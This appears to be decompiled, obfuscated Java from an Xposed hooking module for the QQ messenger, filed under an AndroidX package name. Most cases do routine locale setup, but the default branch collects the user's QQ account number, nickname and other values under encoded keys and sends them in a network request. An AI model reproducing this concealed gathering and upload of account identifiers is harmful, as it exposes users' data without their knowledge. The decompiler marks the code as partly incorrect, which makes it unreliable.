package androidx.appcompat.app;

import android.content.ComponentName;
import android.content.Context;
import android.os.Build;
import android.os.Handler;
import android.util.Pair;
import androidx.collection.C1108;
import androidx.collection.C1122;
import androidx.core.os.C3011;
import androidx.core.os.C3015;
import androidx.profileinstaller.AbstractC3272;
import androidx.profileinstaller.ExecutorC3274;
import com.alibaba.fastjson2.JSONObject;
import java.lang.ref.WeakReference;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.LinkedBlockingQueue;
import java.util.concurrent.ThreadPoolExecutor;
import java.util.concurrent.TimeUnit;
import kotlin.jvm.internal.Ref$ObjectRef;
import lin.xposed.hook.util.p011qq.QQEnvTool;
import p026.AbstractC7017;
import p103.C7897;
import p178.AbstractC8482;
import p269.AbstractC9019;
import p303.AbstractC9234;
import p332.C9496;
import p351.AbstractC9618;
import p361.C9663;
import p368.AbstractC9694;
import p368.RunnableC9697;

/* JADX INFO: renamed from: androidx.appcompat.app.飘花落叶言子楪哲苏世兰, reason: contains not printable characters */
/* JADX INFO: compiled from: r8-map-id-447c03deab370cabd87f71de7ff996ccc1a6dc9764ce389c731d875d052048e4 */
/* JADX INFO: loaded from: classes.dex */
public final /* synthetic */ class RunnableC0947 implements Runnable {

    /* JADX INFO: renamed from: 飘花落叶言子楪哲兰世苏, reason: contains not printable characters */
    public final /* synthetic */ Context f627;

    /* JADX INFO: renamed from: 飘花落叶言子楪哲苏兰世, reason: contains not printable characters */
    public final /* synthetic */ int f628;

    public /* synthetic */ RunnableC0947(Context context, int i) {
        this.f628 = i;
        this.f627 = context;
    }

    /* JADX WARN: Removed duplicated region for block: B:40:0x0136  */
    /* JADX WARN: Removed duplicated region for block: B:43:0x0142  */
    @Override // java.lang.Runnable
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final void run() {
        C3011 c3011;
        Object systemService;
        Context context;
        int i = this.f628;
        int i2 = 1;
        Context context2 = this.f627;
        switch (i) {
            case 0:
                int i3 = Build.VERSION.SDK_INT;
                if (i3 >= 33) {
                    ComponentName componentName = new ComponentName(context2, "androidx.appcompat.app.AppLocalesMetadataHolderService");
                    if (context2.getPackageManager().getComponentEnabledSetting(componentName) != 1) {
                        if (i3 >= 33) {
                            C1122 c1122 = AbstractC0941.f617;
                            c1122.getClass();
                            C1108 c1108 = new C1108(c1122);
                            while (true) {
                                if (c1108.hasNext()) {
                                    AbstractC0941 abstractC0941 = (AbstractC0941) ((WeakReference) c1108.next()).get();
                                    if (abstractC0941 != null && (context = ((LayoutInflaterFactory2C0915) abstractC0941).f514) != null) {
                                        systemService = context.getSystemService("locale");
                                    }
                                } else {
                                    systemService = null;
                                }
                            }
                            c3011 = systemService != null ? new C3011(new C3015(AbstractC0945.m889(systemService))) : C3011.f6797;
                            if (c3011.f6798.f6800.isEmpty()) {
                                String strM13481 = AbstractC8482.m13481(context2);
                                Object systemService2 = context2.getSystemService("locale");
                                if (systemService2 != null) {
                                    AbstractC0945.m888(systemService2, AbstractC0948.m890(strM13481));
                                }
                            }
                            context2.getPackageManager().setComponentEnabledSetting(componentName, 1, 1);
                        } else {
                            c3011 = AbstractC0941.f619;
                            if (c3011 == null) {
                            }
                            if (c3011.f6798.f6800.isEmpty()) {
                            }
                            context2.getPackageManager().setComponentEnabledSetting(componentName, 1, 1);
                        }
                    }
                }
                AbstractC0941.f616 = true;
                break;
            case 1:
                new ThreadPoolExecutor(0, 1, 0L, TimeUnit.MILLISECONDS, new LinkedBlockingQueue()).execute(new RunnableC0947(context2, 2));
                break;
            case 2:
                AbstractC3272.m5104(context2, new ExecutorC3274(), AbstractC3272.f7452, false);
                break;
            default:
                try {
                    JSONObject jSONObjectM14935 = C9496.m14935();
                    jSONObjectM14935.put(AbstractC9234.m14532("喵喵呜喵喵呜呜喵~喵喵喵呜呜呜喵喵~喵喵喵呜喵呜喵喵"), QQEnvTool.getCurrentUin());
                    jSONObjectM14935.put(AbstractC9234.m14531(2862), QQEnvTool.getCurrentAccountNickName());
                    Pair pairM14265 = AbstractC9019.m14265();
                    if (pairM14265 != null) {
                        jSONObjectM14935.put(AbstractC9234.m14532("喵喵呜呜呜喵呜喵~喵喵喵喵喵呜喵呜"), pairM14265.first);
                        jSONObjectM14935.put(AbstractC9234.m14531(2863), pairM14265.second);
                    }
                    CountDownLatch countDownLatch = new CountDownLatch(1);
                    Ref$ObjectRef ref$ObjectRef = new Ref$ObjectRef();
                    ref$ObjectRef.element = "";
                    Handler handler = AbstractC9694.f25352;
                    context2.getClass();
                    C7897 c7897 = new C7897(ref$ObjectRef, 9, countDownLatch);
                    AbstractC9234.m14532("喵喵喵呜喵喵喵喵~喵喵喵呜呜喵呜喵~喵喵喵呜喵呜喵喵~喵喵喵呜呜呜喵喵~喵喵喵喵喵喵喵喵~喵喵喵呜喵呜喵喵~喵喵喵呜喵呜喵呜");
                    AbstractC9234.m14531(1411);
                    AbstractC9618.f25101.execute(new RunnableC9697(context2, i2, c7897));
                    countDownLatch.await();
                    if (((CharSequence) ref$ObjectRef.element).length() > 0) {
                        jSONObjectM14935.put(AbstractC9234.m14531(2864), ref$ObjectRef.element);
                        jSONObjectM14935.put(AbstractC9234.m14532("喵喵呜呜呜呜呜呜~喵喵喵喵喵喵喵呜"), AbstractC9234.m14532("喵喵喵喵喵喵喵喵~喵喵喵喵喵喵喵呜~喵喵喵呜呜喵呜呜~喵喵喵呜呜喵呜喵~喵喵喵呜喵喵喵呜"));
                    }
                    C9663.m15047().m15070(jSONObjectM14935).execute();
                } catch (Exception e) {
                    AbstractC7017.m12164(AbstractC9234.m14531(2866), e.toString(), e, true);
                    return;
                }
                break;
        }
    }
}
